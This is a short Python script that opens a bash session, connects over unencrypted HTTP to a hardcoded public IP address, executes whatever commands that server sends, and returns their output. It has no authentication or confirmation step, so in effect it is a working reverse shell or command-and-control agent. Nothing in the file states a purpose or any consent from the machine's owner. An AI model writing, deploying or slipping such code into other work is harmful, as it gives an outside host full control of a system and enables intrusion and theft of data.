import pexpect
import socketio
import re
import time

sio = socketio.Client()

# Function to remove ANSI escape codes
def remove_ansi_escape_codes(text):
    ansi_escape_pattern = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_pattern.sub('', text)

child = pexpect.spawn('/bin/bash', encoding='utf-8', timeout=None)  # Start a bash session

@sio.event
def connect():
    print("Successfully connected to the server.")

@sio.event
def disconnect():
    print("Disconnected from the server.")

@sio.on('execute_command')
def on_execute_command(data):
    command = data['command']
    print(f"Executing command: {command}")
    child.sendline(command)  # Send command to the bash session
    time.sleep(0.5)  # Adjust this delay as necessary
    child.expect([pexpect.EOF, pexpect.TIMEOUT], timeout=1)  # Attempt to match EOF or timeout
    output = remove_ansi_escape_codes(child.before)  # Clean up output
    print(f"Received output: {output}")  # Debug: Print output to console
    sio.emit('command_output', {'output': output.strip()})

if __name__ == '__main__':
    sio.connect('http://80.108.95.253:8000/')
    sio.wait()
